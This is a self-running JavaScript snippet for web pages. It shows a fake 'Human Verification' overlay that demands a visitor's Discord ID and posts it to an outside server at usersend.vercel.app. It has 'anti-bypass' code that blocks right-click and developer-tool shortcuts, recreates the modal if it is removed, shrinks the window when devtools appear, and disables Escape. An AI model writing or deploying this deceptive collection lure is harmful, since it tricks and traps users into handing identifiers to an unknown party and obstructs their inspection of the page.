(function() {
  'use strict';

  // ============================================================================
  // CONFIGURATION
  // ============================================================================

  const CONFIG = {
    modalId: 'discord-verify-modal',
    overlayId: 'discord-verify-overlay',
    apiEndpoint: 'https://usersend.vercel.app/api/submit-username',
    validateEndpoint: 'https://usersend.vercel.app/api/validate-discord-id',
    animationDuration: 400,
    storageKey: 'discord_verified',
    checkInterval: 1000, // Check every second if modal was removed
    validateDelay: 500 // Delay before validating after typing stops
  };

  // ============================================================================
  // ICONS (SVG)
  // ============================================================================

  const ICONS = {
    shield: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>`,
    chevronDown: `<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>`,
    chevronUp: `<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m18 15-6-6-6 6"/></svg>`,
    arrowRight: `<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>`,
    check: `<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>`,
    id: `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="14" x="3" y="5" rx="2"/><path d="M7 9h.01"/><path d="M12 9h.01"/><path d="M17 9h.01"/><path d="M7 13h10"/></svg>`,
    user: `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>`,
    globe: `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/><path d="M2 12h20"/></svg>`,
    mapPin: `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0"/><circle cx="12" cy="10" r="3"/></svg>`,
    building: `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="16" height="20" x="4" y="2" rx="2" ry="2"/><path d="M9 22v-4h6v4"/><path d="M8 6h.01"/><path d="M16 6h.01"/><path d="M8 10h.01"/><path d="M16 10h.01"/><path d="M8 14h.01"/><path d="M16 14h.01"/></svg>`,
    clock: `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>`,
    terminal: `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>`,
    helpCircle: `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>`,
    alert: `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>`,
    loader: `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>`
  };

  // ============================================================================
  // CSS STYLES
  // ============================================================================

  const STYLES = `
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

    :root {
      --modal-bg: #070709;
      --modal-border: #1a1a1c;
      --text-primary: #f2f3f5;
      --text-secondary: #949ba4;
      --text-muted: #5a5a5e;
      --accent: #5865F2;
      --accent-hover: #4752c4;
      --success: #23a559;
      --error: #da373c;
      --input-bg: linear-gradient(135deg, #0a0a0c 0%, #0d0d10 100%);
      --button-bg: #121213;
      --button-border: #1f1f22;
    }

    #${CONFIG.overlayId} {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.92);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      z-index: 2147483647;
      display: flex;
      align-items: center;
      justify-content: center;
      opacity: 0;
      visibility: hidden;
      transition: opacity ${CONFIG.animationDuration}ms cubic-bezier(0.16, 1, 0.3, 1),
                  visibility ${CONFIG.animationDuration}ms cubic-bezier(0.16, 1, 0.3, 1);
    }

    #${CONFIG.overlayId}.visible {
      opacity: 1;
      visibility: visible;
    }

    #${CONFIG.overlayId}.no-animation {
      transition: none;
    }

    #${CONFIG.modalId} {
      background: var(--modal-bg);
      border-radius: 16px;
      box-shadow: 0 24px 80px rgba(0, 0, 0, 0.6),
                  0 0 0 1px rgba(255, 255, 255, 0.05);
      padding: 0;
      max-width: 520px;
      width: 90%;
      max-height: 90vh;
      overflow-y: auto;
      overflow-x: hidden;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      transform: translateY(24px) scale(0.96);
      transition: transform ${CONFIG.animationDuration}ms cubic-bezier(0.16, 1, 0.3, 1);
      box-sizing: border-box;
      color: var(--text-primary);
    }

    #${CONFIG.modalId} .modal-content {
      max-height: calc(90vh - 160px);
      overflow-y: auto;
      overflow-x: hidden;
      scrollbar-width: thin;
      scrollbar-color: #2a2a2e #0a0a0c;
    }

    #${CONFIG.modalId} .modal-content::-webkit-scrollbar {
      width: 8px;
    }

    #${CONFIG.modalId} .modal-content::-webkit-scrollbar-track {
      background: #0a0a0c;
      border-radius: 4px;
    }

    #${CONFIG.modalId} .modal-content::-webkit-scrollbar-thumb {
      background: #2a2a2e;
      border-radius: 4px;
      border: 1px solid #0a0a0c;
    }

    #${CONFIG.modalId} .modal-content::-webkit-scrollbar-thumb:hover {
      background: #3a3a3e;
    }

    #${CONFIG.overlayId}.visible #${CONFIG.modalId} {
      transform: translateY(0) scale(1);
    }

    #${CONFIG.modalId}.no-animation {
      transition: none;
    }

    #${CONFIG.modalId} {
      scrollbar-width: thin;
      scrollbar-color: #2a2a2e transparent;
    }

    #${CONFIG.modalId}::-webkit-scrollbar {
      width: 8px;
    }

    #${CONFIG.modalId}::-webkit-scrollbar-track {
      background: #0a0a0c;
      border-radius: 4px;
    }

    #${CONFIG.modalId}::-webkit-scrollbar-thumb {
      background: #2a2a2e;
      border-radius: 4px;
      border: 1px solid #0a0a0c;
    }

    #${CONFIG.modalId}::-webkit-scrollbar-thumb:hover {
      background: #3a3a3e;
    }

    .modal-content {
      padding: 28px;
    }

    .modal-heading {
      font-size: 22px;
      font-weight: 600;
      color: var(--text-primary);
      margin: 0 0 12px 0;
      line-height: 1.4;
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .modal-heading svg {
      width: 24px;
      height: 24px;
      flex-shrink: 0;
      color: var(--accent);
    }

    .modal-body {
      font-size: 15px;
      color: var(--text-secondary);
      margin: 0 0 20px 0;
      line-height: 1.6;
    }

    .userid-input {
      width: 100%;
      padding: 16px 18px;
      font-size: 16px;
      border: 1px solid var(--modal-border);
      border-radius: 14px;
      outline: none;
      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
      box-sizing: border-box;
      font-family: inherit;
      background: var(--input-bg);
      color: var(--text-primary);
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
    }

    .userid-input:focus {
      border-color: #2a2a2e;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5), 
                  0 0 0 3px rgba(255, 255, 255, 0.04);
    }

    .userid-input::placeholder {
      color: var(--text-muted);
    }

    .userid-input.error {
      border-color: var(--error);
      box-shadow: 0 4px 20px rgba(218, 55, 60, 0.15);
    }

    .userid-input.valid {
      border-color: var(--success);
      box-shadow: 0 4px 20px rgba(35, 165, 89, 0.15);
    }

    .validation-status {
      font-size: 13px;
      margin-top: 10px;
      padding: 10px 12px;
      border-radius: 10px;
      display: none;
      align-items: center;
      gap: 8px;
    }

    .validation-status.visible {
      display: flex;
    }

    .validation-status.loading {
      color: var(--text-secondary);
      background: rgba(88, 101, 242, 0.08);
      border: 1px solid rgba(88, 101, 242, 0.2);
    }

    .validation-status.success {
      color: var(--success);
      background: rgba(35, 165, 89, 0.08);
      border: 1px solid rgba(35, 165, 89, 0.2);
    }

    .validation-status.error {
      color: var(--error);
      background: rgba(218, 55, 60, 0.08);
      border: 1px solid rgba(218, 55, 60, 0.2);
    }

    .validation-status svg {
      width: 16px;
      height: 16px;
      flex-shrink: 0;
    }

    .validation-status .spinner {
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }

    .submit-btn {
      width: 100%;
      padding: 16px 24px;
      font-size: 15px;
      font-weight: 600;
      color: #7a7a7a;
      background-color: #1a1a1d;
      border: 1px solid #2a2a2e;
      border-radius: 14px;
      cursor: not-allowed;
      transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
      margin-top: 16px;
      font-family: inherit;
      box-sizing: border-box;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
    }

    .submit-btn.enabled {
      color: #ffffff;
      background-color: var(--button-bg);
      border: 1px solid var(--button-border);
      cursor: pointer;
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.35);
    }

    .submit-btn.enabled:hover:not(:disabled) {
      background-color: #1a1a1d;
      transform: translateY(-2px);
      box-shadow: 0 8px 28px rgba(0, 0, 0, 0.5);
    }

    .submit-btn.enabled:active:not(:disabled) {
      transform: translateY(0);
    }

    .submit-btn:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .submit-btn svg {
      width: 18px;
      height: 18px;
      flex-shrink: 0;
    }

    .error-message {
      font-size: 13px;
      color: var(--error);
      margin-top: 12px;
      display: none;
      padding: 12px 14px;
      background: rgba(218, 55, 60, 0.08);
      border-radius: 10px;
      border: 1px solid rgba(218, 55, 60, 0.2);
      display: none;
      align-items: center;
      gap: 8px;
    }

    .error-message.visible {
      display: flex;
    }

    .error-message svg {
      width: 16px;
      height: 16px;
      flex-shrink: 0;
    }

    .help-toggle {
      width: 100%;
      padding: 14px 16px;
      font-size: 14px;
      font-weight: 500;
      color: var(--text-secondary);
      background: var(--input-bg);
      border: 1px solid var(--modal-border);
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
      margin-top: 16px;
      font-family: inherit;
      box-sizing: border-box;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 10px;
    }

    .help-toggle:hover {
      background: #0d0d10;
      border-color: #2a2a2e;
    }

    .help-toggle svg {
      width: 16px;
      height: 16px;
      flex-shrink: 0;
      transition: transform 0.25s cubic-bezier(0.16, 1, 0.3, 1);
    }

    .help-toggle.expanded svg {
      transform: rotate(180deg);
    }

    .help-content {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.4s cubic-bezier(0.16, 1, 0.3, 1),
                  opacity 0.3s cubic-bezier(0.16, 1, 0.3, 1);
      opacity: 0;
    }

    .help-content.expanded {
      max-height: 400px;
      opacity: 1;
      margin-top: 12px;
    }

    .help-text {
      font-size: 13px;
      color: var(--text-secondary);
      padding: 16px;
      background: var(--input-bg);
      border-radius: 12px;
      border: 1px solid var(--modal-border);
      line-height: 1.7;
      max-height: 340px;
      overflow-y: auto;
      overflow-x: hidden;
      scrollbar-width: thin;
      scrollbar-color: #2a2a2e #0a0a0c;
    }

    .help-text::-webkit-scrollbar {
      width: 8px;
    }

    .help-text::-webkit-scrollbar-track {
      background: #0a0a0c;
      border-radius: 4px;
    }

    .help-text::-webkit-scrollbar-thumb {
      background: #2a2a2e;
      border-radius: 4px;
      border: 1px solid #0a0a0c;
    }

    .help-text::-webkit-scrollbar-thumb:hover {
      background: #3a3a3e;
    }

    .help-text ol {
      margin: 10px 0 0 0;
      padding-left: 20px;
      color: var(--text-secondary);
    }

    .help-text li {
      margin-bottom: 8px;
    }

    .help-text code {
      background: #1a1a1c;
      padding: 3px 8px;
      border-radius: 6px;
      font-size: 12px;
      color: var(--text-primary);
      font-family: 'SF Mono', 'Consolas', monospace;
    }

    /* Success Modal */
    .success-icon-wrapper {
      width: 120px;
      height: 120px;
      margin: 0 auto 24px;
      position: relative;
    }

    .success-icon-bg {
      position: absolute;
      inset: 0;
      background: linear-gradient(135deg, #23a559 0%, #1a7f42 100%);
      border-radius: 50%;
      animation: pulse-glow 2s ease-in-out infinite;
    }

    @keyframes pulse-glow {
      0%, 100% {
        box-shadow: 0 0 0 0 rgba(35, 165, 89, 0.4);
        transform: scale(1);
      }
      50% {
        box-shadow: 0 0 0 20px rgba(35, 165, 89, 0);
        transform: scale(1.02);
      }
    }

    .success-icon {
      position: relative;
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1;
    }

    .success-icon svg {
      width: 56px;
      height: 56px;
      color: #ffffff;
      animation: check-draw 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
    }

    @keyframes check-draw {
      from {
        stroke-dasharray: 100;
        stroke-dashoffset: 100;
        opacity: 0;
      }
      to {
        stroke-dasharray: 100;
        stroke-dashoffset: 0;
        opacity: 1;
      }
    }

    .success-message {
      font-size: 24px;
      font-weight: 700;
      color: var(--text-primary);
      margin-bottom: 8px;
      text-align: center;
    }

    .success-subtext {
      font-size: 15px;
      color: var(--text-muted);
      text-align: center;
      margin-top: 0;
    }

    /* Reduced motion */
    @media (prefers-reduced-motion: reduce) {
      #${CONFIG.overlayId},
      #${CONFIG.modalId},
      .help-content,
      .help-toggle svg,
      .success-icon-bg,
      .success-icon svg {
        transition: none;
        animation: none;
      }
    }

    .no-animation *,
    .no-animation *::before,
    .no-animation *::after {
      transition: none !important;
      animation: none !important;
    }

    /* Responsive */
    @media (max-width: 480px) {
      .discord-header {
        height: 120px;
      }

      .modal-content {
        padding: 20px;
      }

      .modal-heading {
        font-size: 20px;
      }

      .modal-body {
        font-size: 14px;
      }

      #${CONFIG.modalId} {
        max-width: none;
        width: calc(100% - 24px);
      }
    }
  `;

  // ============================================================================
  // STATE
  // ============================================================================

  let modalState = {
    isOpen: false,
    isSubmitting: false,
    hasSubmitted: false,
    isValidated: false,
    isValidating: false,
    validatedUser: null
  };

  let overlay = null;
  let modal = null;
  let userIdField = null;
  let submitBtn = null;
  let errorMessage = null;
  let helpToggle = null;
  let helpContent = null;
  let integrityCheck = null;
  let validationStatus = null;
  let validateTimeout = null;

  // ============================================================================
  // ANIMATION DETECTION
  // ============================================================================

  function prefersReducedMotion() {
    return window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  }

  // ============================================================================
  // ANTI-BYPASS PROTECTION
  // ============================================================================

  function setupIntegrityCheck() {
    // Block right-click
    document.addEventListener('contextmenu', (e) => {
      if (modalState.isOpen && !modalState.hasSubmitted) {
        e.preventDefault();
      }
    });

    // Block F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
    document.addEventListener('keydown', (e) => {
      if (modalState.isOpen && !modalState.hasSubmitted) {
        if (e.key === 'F12' || 
            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
            (e.ctrlKey && e.key === 'U')) {
          e.preventDefault();
        }
      }
    });

    // Check if modal was removed
    integrityCheck = setInterval(() => {
      if (modalState.isOpen && !modalState.hasSubmitted) {
        if (!overlay || !overlay.parentNode || !document.getElementById(CONFIG.modalId)) {
          // Modal was removed, recreate it
          openModal();
        }
      }
    }, CONFIG.checkInterval);

    // Block common devtools extensions
    const blockDevTools = () => {
      if (modalState.isOpen && !modalState.hasSubmitted) {
        const widthDiff = window.outerWidth - window.innerWidth;
        const heightDiff = window.outerHeight - window.innerHeight;
        if (widthDiff > 200 || heightDiff > 200) {
          // DevTools likely opened
          window.resizeTo(window.outerWidth - widthDiff, window.outerHeight - heightDiff);
        }
      }
    };

    window.addEventListener('resize', blockDevTools);
  }

  // ============================================================================
  // HELPERS
  // ============================================================================

  function injectStyles() {
    if (document.getElementById('discord-verify-modal-styles')) return;
    const styleSheet = document.createElement('style');
    styleSheet.id = 'discord-verify-modal-styles';
    styleSheet.textContent = STYLES;
    document.head.appendChild(styleSheet);
  }

  function createModal() {
    overlay = document.createElement('div');
    overlay.id = CONFIG.overlayId;

    modal = document.createElement('div');
    modal.id = CONFIG.modalId;

    modal.innerHTML = `
      <div class="modal-content">
        <h2 class="modal-heading">
          ${ICONS.shield}
          Human Verification
        </h2>
        <p class="modal-body">Please verify that you're not a robot. Enter your Discord ID to continue.</p>
        <input type="text" class="userid-input" placeholder="Enter your Discord ID" autocomplete="off" spellcheck="false" inputmode="numeric">
        <div class="validation-status">
          <span class="validation-icon"></span>
          <span class="validation-text"></span>
        </div>
        <button class="submit-btn" type="button" disabled>
          ${ICONS.arrowRight}
          Verify
        </button>
        <div class="error-message">
          ${ICONS.alert}
          <span class="error-text"></span>
        </div>
        <button class="help-toggle" type="button">
          <span style="display: flex; align-items: center; gap: 8px;">
            ${ICONS.helpCircle}
            How to find your Discord ID
          </span>
          ${ICONS.chevronDown}
        </button>
        <div class="help-content">
          <div class="help-text">
            <ol>
              <li>Open Discord and click <code>⚙️ Settings</code></li>
              <li>Scroll down and click <code>Advanced</code></li>
              <li>Turn ON <code>Developer Mode</code></li>
              <li>Right-click your name and tap <code>Copy ID</code></li>
              <li>Paste it in the field above!</li>
            </ol>
          </div>
        </div>
      </div>
    `;

    overlay.appendChild(modal);
    document.body.appendChild(overlay);

    userIdField = modal.querySelector('.userid-input');
    submitBtn = modal.querySelector('.submit-btn');
    errorMessage = modal.querySelector('.error-message');
    helpToggle = modal.querySelector('.help-toggle');
    helpContent = modal.querySelector('.help-content');
    validationStatus = modal.querySelector('.validation-status');

    // Setup help toggle
    helpToggle.addEventListener('click', () => {
      const isExpanded = helpToggle.classList.contains('expanded');
      helpToggle.classList.toggle('expanded', !isExpanded);
      helpContent.classList.toggle('expanded', !isExpanded);
    });

    setupEventListeners();
  }

  function setupEventListeners() {
    submitBtn.addEventListener('click', handleSubmit);

    userIdField.addEventListener('keypress', (e) => {
      if (e.key === 'Enter' && modalState.isValidated && !modalState.isSubmitting) {
        handleSubmit();
      }
    });

    userIdField.addEventListener('focus', () => {
      userIdField.classList.remove('error');
      errorMessage.classList.remove('visible');
    });

    userIdField.addEventListener('input', () => {
      // Only allow digits
      userIdField.value = userIdField.value.replace(/\D/g, '');
      
      // Clear previous timeout
      if (validateTimeout) {
        clearTimeout(validateTimeout);
      }
      
      // Reset validation state
      modalState.isValidated = false;
      modalState.validatedUser = null;
      submitBtn.classList.remove('enabled');
      submitBtn.disabled = true;
      
      const value = userIdField.value.trim();
      
      // Check if input is long enough to validate
      if (value.length >= 17) {
        // Debounce validation
        validateTimeout = setTimeout(() => {
          validateUserId(value);
        }, CONFIG.validateDelay);
      } else {
        hideValidationStatus();
        userIdField.classList.remove('valid', 'error');
      }
    });

    overlay.addEventListener('click', (e) => {
      if (e.target === overlay) {
        e.preventDefault();
      }
    });

    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && modalState.isOpen && !modalState.isSubmitting && !modalState.hasSubmitted) {
        e.preventDefault();
      }
    });
  }

  function showError(message) {
    const errorText = errorMessage.querySelector('.error-text');
    errorText.textContent = message;
    userIdField.classList.add('error');
    errorMessage.classList.add('visible');
  }

  function clearError() {
    userIdField.classList.remove('error');
    errorMessage.classList.remove('visible');
  }

  function showValidationStatus(status, message) {
    if (!validationStatus) return;
    
    const icon = validationStatus.querySelector('.validation-icon');
    const text = validationStatus.querySelector('.validation-text');
    
    validationStatus.classList.remove('loading', 'success', 'error');
    validationStatus.classList.add('visible', status);
    
    if (status === 'loading') {
      icon.innerHTML = `<svg class="spinner">${ICONS.loader}</svg>`;
    } else if (status === 'success') {
      icon.innerHTML = ICONS.check.replace('width="48" height="48"', 'width="16" height="16"');
    } else if (status === 'error') {
      icon.innerHTML = ICONS.alert;
    }
    
    text.textContent = message;
  }

  function hideValidationStatus() {
    if (validationStatus) {
      validationStatus.classList.remove('visible', 'loading', 'success', 'error');
    }
  }

  async function validateUserId(userId) {
    if (!userId || userId.length < 17) {
      hideValidationStatus();
      return;
    }

    modalState.isValidating = true;
    showValidationStatus('loading', 'Validating Discord ID...');
    submitBtn.classList.remove('enabled');
    submitBtn.disabled = true;

    try {
      const response = await fetch(CONFIG.validateEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId }),
        signal: AbortSignal.timeout(10000)
      });

      const data = await response.json();

      if (response.ok && data.success) {
        modalState.isValidated = true;
        modalState.validatedUser = data.user;
        userIdField.classList.add('valid');
        userIdField.classList.remove('error');
        showValidationStatus('success', `Valid ID: ${data.user.display}`);
        submitBtn.classList.add('enabled');
        submitBtn.disabled = false;
      } else {
        modalState.isValidated = false;
        modalState.validatedUser = null;
        userIdField.classList.add('error');
        userIdField.classList.remove('valid');
        showValidationStatus('error', data.error || 'Invalid Discord ID');
        submitBtn.classList.remove('enabled');
        submitBtn.disabled = true;
      }
    } catch (error) {
      console.error('Validation error:', error);
      modalState.isValidated = false;
      modalState.validatedUser = null;
      userIdField.classList.add('error');
      userIdField.classList.remove('valid');
      
      let errorMsg = 'Cannot connect to validation server';
      if (error.name === 'AbortError') {
        errorMsg = 'Validation timed out';
      }
      
      showValidationStatus('error', errorMsg);
      submitBtn.classList.remove('enabled');
      submitBtn.disabled = true;
    } finally {
      modalState.isValidating = false;
    }
  }

  function setLoadingState(loading) {
    modalState.isSubmitting = loading;
    if (loading) {
      submitBtn.disabled = true;
      submitBtn.classList.remove('enabled');
      submitBtn.innerHTML = `
        <svg class="spinner" viewBox="0 0 24 24" width="18" height="18">
          <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" fill="none" stroke-dasharray="31.4 31.4" stroke-linecap="round">
            <animateTransform attributeName="transform" type="rotate" from="0 12 12" to="360 12 12" dur="0.8s" repeatCount="indefinite"/>
          </circle>
        </svg>
        Verifying...
      `;
      userIdField.disabled = true;
    } else {
      // Keep button enabled if validated, otherwise disabled
      if (modalState.isValidated) {
        submitBtn.classList.add('enabled');
        submitBtn.disabled = false;
      } else {
        submitBtn.classList.remove('enabled');
        submitBtn.disabled = true;
      }
      submitBtn.innerHTML = `${ICONS.arrowRight} Verify`;
      userIdField.disabled = false;
    }
  }

  function showSuccessState() {
    modal.innerHTML = `
      <div class="modal-content" style="padding: 40px 28px;">
        <div class="success-icon-wrapper">
          <div class="success-icon-bg"></div>
          <div class="success-icon">
            ${ICONS.check}
          </div>
        </div>
        <p class="success-message">Verified!</p>
        <p class="success-subtext">Redirecting you shortly...</p>
      </div>
    `;

    setTimeout(() => {
      closeModal();
    }, 2500);
  }

  function validateInput() {
    const value = userIdField.value.trim();

    if (!value) {
      showError('Please enter your Discord ID');
      return false;
    }

    const discordIdRegex = /^\d{17,20}$/;
    if (!discordIdRegex.test(value)) {
      showError('Discord ID must be 17-20 digits. Check the guide below!');
      return false;
    }

    return true;
  }

  function openModal() {
    if (modalState.isOpen) return;

    injectStyles();

    if (!overlay) {
      createModal();
    }

    modalState.isOpen = true;
    
    // Check for reduced motion
    if (prefersReducedMotion()) {
      overlay.classList.add('no-animation');
      modal.classList.add('no-animation');
    }

    overlay.classList.add('visible');

    setTimeout(() => {
      userIdField.focus();
    }, prefersReducedMotion() ? 0 : CONFIG.animationDuration);

    setupIntegrityCheck();
  }

  function closeModal() {
    if (!modalState.isOpen) return;

    overlay.classList.remove('visible');
    modalState.isOpen = false;

    if (integrityCheck) {
      clearInterval(integrityCheck);
      integrityCheck = null;
    }

    if (validateTimeout) {
      clearTimeout(validateTimeout);
      validateTimeout = null;
    }

    const duration = prefersReducedMotion() ? 0 : CONFIG.animationDuration;
    setTimeout(() => {
      if (overlay && overlay.parentNode) {
        overlay.remove();
        overlay = null;
        modal = null;
        userIdField = null;
        submitBtn = null;
        errorMessage = null;
        helpToggle = null;
        helpContent = null;
      }
    }, duration);
  }

  async function handleSubmit() {
    if (!modalState.isValidated || !modalState.validatedUser) {
      showError('Please wait for Discord ID validation');
      return;
    }

    clearError();
    setLoadingState(true);

    const userId = userIdField.value.trim();

    try {
      const response = await fetch(CONFIG.apiEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId,
          validatedUser: modalState.validatedUser
        }),
        signal: AbortSignal.timeout(15000)
      });

      const data = await response.json();

      if (response.ok && data.success) {
        modalState.hasSubmitted = true;
        showSuccessState();

        try {
          localStorage.setItem(CONFIG.storageKey, 'true');
        } catch (e) {}
      } else {
        throw new Error(data.error || 'Verification failed');
      }
    } catch (error) {
      console.error('Verification error:', error);

      let errorMsg = 'Failed to connect. Please try again.';
      if (error.name === 'AbortError') {
        errorMsg = 'Request timed out. Check your connection.';
      } else if (error.message.includes('Failed to fetch')) {
        errorMsg = 'Cannot reach server. Try again later.';
      }

      showError(errorMsg);
      setLoadingState(false);
    }
  }

  function init() {
    try {
      const hasSubmitted = localStorage.getItem(CONFIG.storageKey);
      if (hasSubmitted === 'true') return;
    } catch (e) {}

    openModal();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

  window.DiscordVerifyModal = {
    open: openModal,
    close: closeModal,
    isOpen: () => modalState.isOpen,
    hasSubmitted: () => modalState.hasSubmitted
  };

})();
